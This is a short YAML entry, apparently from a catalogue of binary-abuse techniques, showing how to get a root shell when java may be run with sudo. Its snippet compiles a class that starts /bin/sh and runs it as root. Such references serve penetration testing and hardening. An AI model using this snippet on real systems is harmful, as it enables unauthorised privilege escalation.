---
functions:
  sudo:
    - code: |
        TD=$(mktemp -d)
        SOURCE='public class Exec { public static void main(String[] args) throws Exception { new ProcessBuilder("/bin/sh").inheritIO().start().waitFor(); } }'
        echo "$SOURCE" > $TD/Exec.java
        javac $TD/Exec.java
        sudo java -cp $TD Exec
---
